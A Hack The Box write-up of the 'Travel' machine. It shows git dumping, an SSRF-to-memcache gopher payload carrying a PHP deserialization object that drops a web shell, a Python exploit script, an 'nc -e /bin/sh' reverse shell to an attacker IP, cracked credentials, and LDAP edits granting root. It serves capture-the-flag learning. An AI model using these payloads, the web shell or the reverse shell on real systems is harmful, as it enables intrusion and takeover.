---
title: "Hack The Box - Travel"
tags: [linux,hard,ssrf,gopher.git,serialize,ldap]
categories: HackTheBox
---

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled.png)

We are going to pwn Travel from Hack The Box.                                                             

Link: [https://www.hackthebox.eu/home/machines/profile/252](https://www.hackthebox.eu/home/machines/profile/252)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```nix
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.17.6
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB
443/tcp open  ssl/http nginx 1.17.6
|_http-server-header: nginx/1.17.6
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
| Not valid before: 2020-04-23T19:24:29
|_Not valid after:  2030-04-21T19:24:29
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.18 - 2.6.22 (96%), Linux 3.2.0 (96%), Linux 2.6.18 (96%), Tomato 1.27 - 1.28 (Linux 2.4.20) (96%), Tomato 1.28 (Linux 2.4.20) (95%), Linux 3.7 (95%), MikroTik RouterOS 6.15 (Linux 3.3.5) (94%), ZoneAlarm Z100G WAP (94%), Linux 4.8 (93%), HP Onboard Administrator 4.12 - 4.40 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP Enumeration

There is nothing special here.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%201.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%201.png)

There is a mail id in the bottom, can be an user.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%202.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%202.png)

## HTTPS Enumeration

Its not currently available.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%203.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%203.png)

We got some sub domains from nmap scan and we can also see them in HTTPS certificate information.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%204.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%204.png)

`blog.travel.htb`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%205.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%205.png)

Its a wordpress site. I decided to run Gobuster here.

## GoBuster Result

```nix
===============================================================
[+] Url:            http://blog.travel.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/02 11:50:26 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/0 (Status: 301)
/A (Status: 301)
/a (Status: 301)
/admin (Status: 302)
/atom (Status: 301)
/aw (Status: 301)
/dashboard (Status: 302)
/embed (Status: 301)
/favicon.ico (Status: 302)
/feed (Status: 301)
/h (Status: 301)
/H (Status: 301)
/hello (Status: 301)
/index.php (Status: 301)
/login (Status: 302)
/page1 (Status: 301)
/rdf (Status: 301)
/robots.txt (Status: 200)
/rss (Status: 301)
/rss2 (Status: 301)
/server-status (Status: 403)
/wp-content (Status: 301)
/wp-admin (Status: 301)
/wp-includes (Status: 301)
===============================================================
2020/06/02 11:55:16 Finished
===============================================================
```

`blog-dev.travel.htb`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%206.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%206.png)

```nix
 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php | HTTP method: get | Threads: 10 | Wordlist size: 4614

Error Log: /root/hacking-tools/dirsearch/logs/errors-20-06-02_14-14-37.log

Target: http://blog-dev.travel.htb/

[14:14:38] Starting: 
[14:14:40] 200 -   23B  - /.git/HEAD
```

But we have permission to get `/.git` Since its a git directory we can dump them all using`gitdumper`

> [https://github.com/internetwache/GitTools](https://github.com/internetwache/GitTools)

```bash
root@kali:~/CTF/HTB/Boxes/Travel# ./gitdumper.sh http://blog-dev.travel.htb/.git/ gitextract/
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########

[*] Destination folder does not exist
[+] Creating gitextract//.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/03/13850ae948d71767aff2cc8cc0f87a0feeef63
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/b0/2b083f68102c4d62c49ed3c99ccbb31632ae9f
[+] Downloaded: objects/ed/116c7c7c51645f1e8a403bcec44873f74208e9
[+] Downloaded: objects/2b/1869f5a2d50f0ede787af91b3ff376efb7b039
[+] Downloaded: objects/30/b6f36ec80e8bc96451e47c49597fdd64cee2da
```

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%207.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%207.png)

There 3 files which are deleted and successfully got them back.

`README.md`

```nix
# Rss Template Extension

Allows rss-feeds to be shown on a custom wordpress page.

## Setup

* `git clone https://github.com/WordPress/WordPress.git`
* copy rss_template.php & template.php to `wp-content/themes/twentytwenty` 
* create logs directory in `wp-content/themes/twentytwenty` 
* create page in backend and choose rss_template.php as theme

## Changelog

- temporarily disabled cache compression
- added additional security checks 
- added caching
- added rss template

## ToDo

- finish logging implementation
```

Here we can see the `rss_template.php` and `template.php` are located in `wp-content/themes/twentytwenty` and `logs` too.

## Analysing the `template.php`:

```php
<?php

/**
 Todo: finish logging implementation via TemplateHelper
*/

function safe($url)
{
	// this should be secure
	$tmpUrl = urldecode($url);
	if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)
	{		
		die("<h2>Hacking attempt prevented (LFI). Event has been logged.</h2>");
	}
	if(strpos($tmpUrl, "-o") !== false or strpos($tmpUrl, "-F") !== false)
	{		
		die("<h2>Hacking attempt prevented (Command Injection). Event has been logged.</h2>");
	}
	$tmp = parse_url($url, PHP_URL_HOST);
	// preventing all localhost access
	if($tmp == "localhost" or $tmp == "127.0.0.1")
	{		
		die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");		
	}
	return $url;
}

function url_get_contents ($url) {
    $url = safe($url);
	$url = escapeshellarg($url);
	$pl = "curl ".$url;
	$output = shell_exec($pl);
    return $output;
}

class TemplateHelper
{

    private $file;
    private $data;

    public function __construct(string $file, string $data)
    {
    	$this->init($file, $data);
    }

    public function __wakeup()
    {
    	$this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {    	
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
}
```

The `template.php` contains helper and utilization function for `rss_template.php`, the noteable explaination of these functions are given below, as they're just utilities their workflow is quite easily understandable:-

```php

function safe($url)
{
	// this should be secure
	$tmpUrl = urldecode($url);
	if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)
	{		
		die("<h2>Hacking attempt prevented (LFI). Event has been logged.</h2>");
	}
	if(strpos($tmpUrl, "-o") !== false or strpos($tmpUrl, "-F") !== false)
	{		
		die("<h2>Hacking attempt prevented (Command Injection). Event has been logged.</h2>");
	}
	$tmp = parse_url($url, PHP_URL_HOST);
	// preventing all localhost access
	if($tmp == "localhost" or $tmp == "127.0.0.1")
	{		
		die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");		
	}
	return $url;
}
```

This functions prevents the SSRF i.e. internal network access and LFI(Local File Inclusion) and Command Injection from the `custom_feed_url`.

The following function is also useful and was one of the key elements in the exploitation:-

```php
function url_get_contents ($url) {
    $url = safe($url);
	$url = escapeshellarg($url);
	$pl = "curl ".$url;
	$output = shell_exec($pl);
    return $output;
}
```

This function provided the `url` using the curl, it scrapes the data from it. The other function is a template function handler for the `rss_template`:-

```php
class TemplateHelper
{

    private $file;
    private $data;

    public function __construct(string $file, string $data)
    {
    	$this->init($file, $data);
    }

    public function __wakeup()
    {
    	$this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {    	
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
}

```

It initializes a constructor with the file and it's data, from whatever has been scraped and obtained from the requests, this template handler stored them in the file in the `/logs` directory, for which the absolute path would be `__DIR__/logs` where `__DIR__` is the directory of the wordpress's login plugin resolving to `wp-contents/plugins/twentytwenty/logs/`.

## Analyzing the `rss_template`:

Now, the main file which we have to focus on is `rss_template` since this function is taking care of the the RSS feed which was found on `/awesome-rss`. The most interesting part of this template was, it was accessing an internal URL with memcache protocol at the localhost followed by PHP's `SimplePie` which is a library for managing the RSS feed in a wordpress blog. The following function was a real deal breaker here:-

```php

<main class="section-inner">
	<?php
	function get_feed($url){
     require_once ABSPATH . '/wp-includes/class-simplepie.php';	    
     $simplepie = null;	  
     $data = url_get_contents($url);
     if ($url) {
         $simplepie = new SimplePie();
         $simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');
         //$simplepie->set_raw_data($data);
         $simplepie->set_feed_url($url);
         $simplepie->init();
         $simplepie->handle_content_type();
         if ($simplepie->error) {
             error_log($simplepie->error);
             $simplepie = null;
             $failed = True;
         }
     } else {
         $failed = True;
     }
     return $simplepie;
 	 }

 	$url = $_SERVER['QUERY_STRING'];
	if(strpos($url, "custom_feed_url") !== false){
		$tmp = (explode("=", $url)); 	
		$url = end($tmp); 	
 	 } else {
 	 	$url = "<http://www.travel.htb/newsfeed/customfeed.xml>";
 	 }
 	 $feed = get_feed($url); 
     if ($feed->error())
		{
			echo '<div class="sp_errors">' . "\\r\\n";
			echo '<p>' . htmlspecialchars($feed->error()) . "</p>\\r\\n";
			echo '</div>' . "\\r\\n";
		}
		else {
	?>
	<div class="chunk focus">
		<h3 class="header">
		<?php 
			$link = $feed->get_link();
			$title = $feed->get_title();
			if ($link) 
			{ 
				$title = "<a href='$link' title='$title'>$title</a>"; 
			}
			echo $title;
		?>
		</h3>
		<?php echo $feed->get_description(); ?>
```

These template was the generator of the `/awesome-rss`, this template firstly uses the `memcache` protocol to access the cache server and set it as cache location i.e. `memcache://127.0.0.1:11211/?timeout=60&prefix=xct_'`, then it used the `template.php`'s `url_get_contents` function to get the data from the URL provided which in our case was `http://www.travel.htb/newsfeed/customfeed.xml`. Then using thr `SimplePie` set the contents of as it's attributes then parse it as the `RSS` data. After parsing it, it tends to replicate the data in the form of the HTML which was nothing to be concerned about.

The following was the helpful function since it gives the information about how the requests by `SimplePie` is being handled.

```php
<!--
DEBUG
<?php
if (isset($_GET['debug'])){
  include('debug.php');
}
?>
-->
```

This parses the output as the comment, so when including the `?debug` parameter to request, we had to check the source code of the HTML page rendered.

So I tested SSRF we know we  can't use `127.0.0.1` and `localhost`.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%208.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%208.png)

While trying to access `/etc/passwd` 

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%209.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%209.png)

And Command injection is also blocked so everything seems prevented.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2010.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2010.png)

But still I get response from the server to my machine.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2011.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2011.png)

I downloaded [`http://www.travel.htb/newsfeed/customfeed.xml`](http://www.travel.htb/newsfeed/customfeed.xml) to my machine and started python server and made the `debug=true` 

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2012.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2012.png)

I checked the source code for the debug part here its showing something called `xct_`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2013.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2013.png)

which is nothing but this line `('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');` from `rss_template.php` so it uses memcache to create this and I dont know what kind of hash is that `1db502e643`.

In `template.php` there is a class `TemplateHelper` I did some modification in that to get serialized output of our payload.

1. `$file` is the file name ⇒ shell.php
2. `$data` is the payload ⇒ I used `'<?php system($_REQUEST["cmd"]);'`

```php
<?php
class TemplateHelper
{

    private $file;
    private $data;

    public function __construct()
    {
        $this->file = 'shell.php';
        $this->data = '<?php system($_REQUEST["cmd"]);';
    }
}

$obj = new TemplateHelper();
echo serialize($obj);
echo "\n";

?>
```

I get the serialized object with my payload.

```nix
root@kali:~/CTF/HTB/Boxes/Travel# php attack.php 
O:14:"TemplateHelper":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:31:"<?php system($_REQUEST["cmd"]);";}
```

We know the `custom_feed_url` is accepts our request and there is `simplepie` which use the `memcache` too.

I found this, its helps to create a gopher payload for `phpmemcache` 

> [https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2014.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2014.png)

I examined whats in the payload. URL decoded that.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2015.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2015.png)

Here the script maker used his name as key `SpyD3r` but in our case it must be `xct_` because thats what `memcache` uses and we need to find the hash too. For that I decided to check the SimplePie Github Repo.

[https://github.com/simplepie/simplepie/blob/a72e1dfafe7870affdae3edf0d9a494e4fa31bc6/library/SimplePie/Cache/Memcache.php](https://github.com/simplepie/simplepie/blob/a72e1dfafe7870affdae3edf0d9a494e4fa31bc6/library/SimplePie/Cache/Memcache.php)

This is the main part:

```php
	public function __construct($location, $name, $type)
	{
		$this->options = array(
			'host' => '127.0.0.1',
			'port' => 11211,
			'extras' => array(
				'timeout' => 3600, // one hour
				'prefix' => 'simplepie_',
			),
		);
		$this->options = SimplePie_Misc::array_merge_recursive($this->options, SimplePie_Cache::parse_URL($location));

		$this->name = $this->options['extras']['prefix'] . md5("$name:$type");

		$this->cache = new Memcache();
		$this->cache->addServer($this->options['host'], (int) $this->options['port']);
	}
```

Accoding to the source file:

```nix
Eg : 127.0.0.1:11211/?timeout=3600&prefix=simplepie_md5("$name:$type")

In our case simplepie_ is xct_ and we need find what is $name and $type
```

so it finally makes sense the hash we saw before `1db502e643` is md5 hash. Let's find what is `$name` and `$type`

```php
@param string $type Either TYPE_FEED for SimplePie data, or TYPE_IMAGE for image data
```

So here in `$type` we need SimplePie data, I searched it in repo and so here we can see its `spc`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2016.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2016.png)

```php
@param string $name Unique ID for the cache
```

`$name` is kinda of Unique ID for the cache

We need to find where it comes if we check the source code its calling the class `SimplePie_Cache_Memcache` and so I searched for it in the repo its from `cache.php`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2017.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2017.png)

> [https://github.com/simplepie/simplepie/blob/a72e1dfafe7870affdae3edf0d9a494e4fa31bc6/library/SimplePie/Cache.php](https://github.com/simplepie/simplepie/blob/a72e1dfafe7870affdae3edf0d9a494e4fa31bc6/library/SimplePie/Cache.php)

Here the class `SimplePie_Cache_Memcache` for a function `get_handler` which gets `($location, $filename, $extension)` lets check where its from.

```php
/**
	 * Create a new SimplePie_Cache object
	 *
	 * @param string $location URL location (scheme is used to determine handler)
	 * @param string $filename Unique identifier for cache object
	 * @param string $extension 'spi' or 'spc'
	 * @return SimplePie_Cache_Base Type of object depends on scheme of `$location`
	 */
	public static function get_handler($location, $filename, $extension)
	{
		$type = explode(':', $location, 2);
		$type = $type[0];
		if (!empty(self::$handlers[$type]))
		{
			$class = self::$handlers[$type];
			return new $class($location, $filename, $extension);
		}

		return new SimplePie_Cache_File($location, $filename, $extension);
	}
```

And it is mentioned in `SimplePie.php`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2018.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2018.png)

> [https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php](https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php)

Here we can see how the `get_handler` gets the input 

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2019.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2019.png)

`$location`  = `memcache://127.0.0.1:11211`

`$filename` = `call_user_func($this->cache_name_function, $url)` Its calling another function `cache_name_function` by searching that in the same file, I found that its doing `md5` so its doing `md5($url)`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2020.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2020.png)

`$extension` = `spc`

Now we need to combine them all to make our payload along with Gopherus. 

1. For `$filename` we need to do `md5($url)` ⇒ If we check the `rss_template.php` there is a line `$url = "[http://www.travel.htb/newsfeed/customfeed.xml](http://www.travel.htb/newsfeed/customfeed.xml)";`
2. So the url is md5 encoded now we need to do one more md5 encode with the type.
3. And We need to do `md5("$url:$type")`

```php
root@kali:~/CTF/HTB/Boxes/Travel/Gopherus# echo -n http://www.travel.htb/newsfeed/customfeed.xml| md5sum
3903a76d1e6fef0d76e973a0561cbfc0  -
root@kali:~/CTF/HTB/Boxes/Travel/Gopherus# echo -n "3903a76d1e6fef0d76e973a0561cbfc0:spc"| md5sum
4e5612ba079c530a6b1f148c0b352241  -
root@kali:~/CTF/HTB/Boxes/Travel/Gopherus#
```

We got the key. All we need to do is combine it with gopherus payload.

I made a python script to do all the process

```python
import requests
import urllib

web = "http://blog.travel.htb"

attack = 'O:14:"TemplateHelper":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:31:"<?php system($_REQUEST["cmd"]);";}'

                     # md5("md5($url):$type")
gop = "%0d%0aset xct_4e5612ba079c530a6b1f148c0b352241 4 0 "+ str(len(attack)) +"%0d%0a"+ attack +"%0d%0a"

final_payload = "gopher://127.1:11211/_"+urllib.quote_plus(gop).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")

# print(final_payload)

print ("[*] SSRF ")
mainURL=web+"/awesome-rss/?debug=true&custom_feed_url="+final_payload
r = requests.get(mainURL)
print(r.status_code)
print ("[*] Triggering Deserialization")
x = requests.get(web+'/awesome-rss')
finalURL = web+"/wp-content/themes/twentytwenty/logs/shell.php"
r2 = requests.get(finalURL)
print(r2.status_code)

print ("[*] Getting Shell")
print ('[*] Here is your payload  ==>  http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?cmd=nc+-e+/bin/sh+10.10.14.9+1234')
```

```python
root@kali:~/CTF/HTB/Boxes/Travel# python exploit.py 
[*] SSRF 
200
[*] Triggering Deserialization
200
[*] Getting Shell
[*] ==> Here is your payload http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?cmd=nc+-e+/bin/sh+10.10.14.9+1234
```

Everything seems perfect and we got the reverse shell payload.

I got the shell

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2021.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2021.png)

I started enumeration to get any password for user

```nix
cd /opt
ls
wordpress
cd wordpress
ls
backup-13-04-2020.sql
```

I `cat` that and found some hashes at the bottom.

```sql
--
-- Dumping data for table `wp_users`
--

LOCK TABLES `wp_users` WRITE;
/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;
INSERT INTO `wp_users` VALUES (1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb','http://localhost','2020-04-13 13:19:01','',0,'admin'),(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb','','2020-04-13 13:36:18','',0,'Lynik Schmidt');
/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
```

Cracked that using `john`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2022.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2022.png)

We know ssh port is open so I logged in with the credentials we got `lynik-admin : 1stepcloser`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2023.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2023.png)

## Privilege Escalation:

In the home directory there is a file `.ldaprc` and it reveals ldap info.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2024.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2024.png)

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2025.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2025.png)

We got user `lynik-admin`'s ldap password `Theroadlesstraveled`

With the password we got, We can list all the users 

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2026.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2026.png)

There is a lot of user and If we look closely `lynik-admin` is `LDAP administrator`. Since we are the Adminstrator of LDAP we can play with it.

> [https://docs.oracle.com/cd/E19424-01/820-4809/bcacx/index.html](https://docs.oracle.com/cd/E19424-01/820-4809/bcacx/index.html)

> [http://pig.made-it.com/ldap-openssh.html](http://pig.made-it.com/ldap-openssh.html)

> [https://simp.readthedocs.io/en/5.1.0-2/user_guide/User_Management/LDAP.html](https://simp.readthedocs.io/en/5.1.0-2/user_guide/User_Management/LDAP.html)

I read the above docs to understand what we can do and so by combining them. Our plan is to add an user to sudoers group and give him an ssh keys to login and make the homeDirectory to root.

So I have created my ssh keys.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2027.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2027.png)

Grabbed the sudo id

```nix
lynik-admin@travel:~$ cat /etc/group | grep sudo
sudo:x:27:trvl-admin
```

I created a payload with them.

```nix
dn: uid=jerry,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changetype: modify
replace: homeDirectory
homeDirectory: /root
-
add: objectClass
objectClass: ldapPublicKey
-
add: sshPublicKey
sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSk6zuoPVc+U2KbwSOfOiN/kt279KxWnJ9vUDeYAM0GGK/yg+jCfH6yqNYaAswfCXgrssqKtOerQLWL0PjCDhXg3UADzyrVDZhgKx6t1a7Jj5/YVIUrWEUFmfl9KODxho7a3l2RT/zZXbUPZp+fQ5I280mh6Jiu3BdAUDEr19KQ3CPlKOctsTSVyPKH4Uue2LButAqelQp5LxTwhjYSXnvvZPpkbOr3cS0KQXGW7EE4Jqvi1osSm6RrbHN51slX6kX1YnKdfFKDukfYINlgaYKgpzouxbtn4g43FBRdmOMNEjAl6W7i9JhqB+ewyXgj7Szyjxm8fdZJ1nQtvFVwCIRS8w4ud90LBYqawCFzlGG8z4o4hs9Y+0X0n/aWDVMZZfJ3EEmgVPXEhapRmrNY5xeB9D/2Ncfd2XHlvCorw7/sFFCvF2+t+iFScGZ4ZCxAT0ymwJ3YAuHqtfaWTlhFRIaWhrOHPhdhHUthqNRi+M3ramOhY4/niMjnikYTi9ePJE= root@kali
-
replace: userPassword
userPassword: wolf
-
replace: gidNumber
gidNumber: 27
```

So by doing this we modified user `jerry` ( I just choosed random from the ldapusers we already got)

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2028.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2028.png)

Logged with the private ssh keys. Since we are the sudoers group we can `su` to `root` and I changed the password of `jerry` as `wolf`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2029.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-travel/Untitled%2029.png)

We own the root